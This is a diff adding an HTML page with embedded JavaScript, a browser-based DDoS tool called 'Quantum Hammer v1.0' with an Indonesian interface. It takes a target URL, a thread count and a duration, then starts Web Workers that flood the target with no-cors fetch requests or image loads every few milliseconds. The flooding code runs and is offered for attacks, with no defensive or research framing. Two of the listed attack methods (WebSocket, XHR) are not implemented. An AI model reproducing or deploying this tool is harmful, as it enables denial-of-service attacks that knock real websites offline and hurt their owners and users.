@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quantum Hammer v1.0 - DDoS Tool</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
+        body { background: #0a0a0a; color: #0f0; padding: 20px; }
+        .container { max-width: 900px; margin: 0 auto; border: 1px solid #0f0; padding: 20px; }
+        h1 { color: #f00; text-align: center; margin-bottom: 20px; }
+        .input-group { margin: 15px 0; }
+        label { display: block; margin-bottom: 5px; color: #0f0; }
+        input, select { width: 100%; padding: 10px; background: #000; color: #0f0; border: 1px solid #0f0; }
+        .btn { background: #f00; color: #000; border: none; padding: 12px 24px; cursor: pointer; font-weight: bold; margin: 5px; }
+        .btn:hover { background: #ff4444; }
+        .status { margin-top: 20px; padding: 15px; background: #111; border: 1px solid #333; }
+        .log { max-height: 300px; overflow-y: auto; margin-top: 10px; padding: 10px; background: #000; border: 1px solid #0f0; }
+        .log-item { margin: 5px 0; padding: 5px; border-bottom: 1px solid #222; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>☢️ QUANTUM HAMMER v1.0 ☢️</h1>
+        
+        <div class="input-group">
+            <label>Target URL (contoh: http://target.com atau https://target.com/path):</label>
+            <input type="text" id="targetUrl" placeholder="http://target.com">
+        </div>
+        
+        <div class="input-group">
+            <label>Metode Serangan:</label>
+            <select id="attackMethod">
+                <option value="fetch">Fetch Flood (GET Requests)</option>
+                <option value="websocket">WebSocket Flood</option>
+                <option value="img">Image/Resource Flood</option>
+                <option value="xhr">XMLHttpRequest (XHR) Bomb</option>
+            </select>
+        </div>
+        
+        <div class="input-group">
+            <label>Jumlah Threads (Workers):</label>
+            <input type="number" id="threads" value="50" min="1" max="200">
+        </div>
+        
+        <div class="input-group">
+            <label>Durasi Serangan (detik):</label>
+            <input type="number" id="duration" value="60" min="1" max="3600">
+        </div>
+        
+        <div>
+            <button class="btn" onclick="startAttack()">🚀 START DDOS ATTACK</button>
+            <button class="btn" onclick="stopAttack()">⏹️ STOP ATTACK</button>
+            <button class="btn" onclick="clearLog()">🧹 CLEAR LOG</button>
+        </div>
+        
+        <div class="status">
+            <strong>Status:</strong> <span id="statusText">Siap menyerang...</span><br>
+            <strong>Requests Terkirim:</strong> <span id="requestCount">0</span><br>
+            <strong>Waktu Tersisa:</strong> <span id="timeLeft">0</span> detik
+        </div>
+        
+        <div class="log" id="attackLog">
+            <div class="log-item">[SYSTEM] Quantum Hammer siap digunakan.</div>
+        </div>
+    </div>
+
+    <script>
+        let attackActive = false;
+        let requestCounter = 0;
+        let workers = [];
+        let timerInterval;
+
+        function logMessage(msg) {
+            const log = document.getElementById('attackLog');
+            const item = document.createElement('div');
+            item.className = 'log-item';
+            item.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            log.appendChild(item);
+            log.scrollTop = log.scrollHeight;
+        }
+
+        function updateStatus(text) {
+            document.getElementById('statusText').textContent = text;
+        }
+
+        function updateCounter() {
+            document.getElementById('requestCount').textContent = requestCounter;
+        }
+
+        function startAttack() {
+            if (attackActive) {
+                logMessage("[ERROR] Serangan sudah berjalan.");
+                return;
+            }
+
+            const target = document.getElementById('targetUrl').value.trim();
+            const method = document.getElementById('attackMethod').value;
+            const threadCount = parseInt(document.getElementById('threads').value);
+            const duration = parseInt(document.getElementById('duration').value);
+
+            if (!target.startsWith('http')) {
+                logMessage("[ERROR] URL target harus dimulai dengan http:// atau https://");
+                return;
+            }
+
+            attackActive = true;
+            requestCounter = 0;
+            workers = [];
+            updateCounter();
+            updateStatus("MENYERANG...");
+
+            // Timer
+            let timeLeft = duration;
+            document.getElementById('timeLeft').textContent = timeLeft;
+            clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                document.getElementById('timeLeft').textContent = timeLeft;
+                if (timeLeft <= 0) {
+                    stopAttack();
+                }
+            }, 1000);
+
+            logMessage(`[ATTACK] Memulai serangan ke ${target} dengan ${threadCount} threads.`);
+
+            // Buat workers
+            for (let i = 0; i < threadCount; i++) {
+                const worker = new Worker(URL.createObjectURL(new Blob([`
+                    let reqCount = 0;
+                    self.onmessage = function(e) {
+                        const target = e.data.target;
+                        const method = e.data.method;
+                        
+                        if (method === 'fetch') {
+                            setInterval(() => {
+                                fetch(target, {
+                                    method: 'GET',
+                                    mode: 'no-cors',
+                                    cache: 'no-store',
+                                    headers: {
+                                        'X-Attack-Id': 'Quantum-' + Math.random()
+                                    }
+                                }).catch(() => {}).finally(() => {
+                                    reqCount++;
+                                    self.postMessage({count: reqCount});
+                                });
+                            }, 10);
+                        }
+                        else if (method === 'img') {
+                            setInterval(() => {
+                                const img = new Image();
+                                img.src = target + '?rand=' + Math.random();
+                                reqCount++;
+                                self.postMessage({count: reqCount});
+                            }, 5);
+                        }
+                    };
+                `], {type: 'text/javascript'})));
+
+                worker.postMessage({ target, method });
+                worker.onmessage = (e) => {
+                    requestCounter += e.data.count;
+                    updateCounter();
+                };
+                workers.push(worker);
+            }
+
+            logMessage(`[ATTACK] ${threadCount} workers telah diaktifkan.`);
+        }
+
+        function stopAttack() {
+            if (!attackActive) return;
+            
+            attackActive = false;
+            clearInterval(timerInterval);
+            workers.forEach(w => w.terminate());
+            workers = [];
+            updateStatus("SERANGAN DIHENTIKAN");
+            logMessage(`[ATTACK] Serangan dihentikan. Total requests dikirim: ${requestCounter}`);
+        }
+
+        function clearLog() {
+            document.getElementById('attackLog').innerHTML = 
+                '<div class="log-item">[SYSTEM] Log telah dibersihkan.</div>';
+        }
+
+        // Auto-clear workers jika window ditutup
+        window.addEventListener('beforeunload', () => {
+            workers.forEach(w => w.terminate());
+        });
+    </script>
+</body>
+</html>
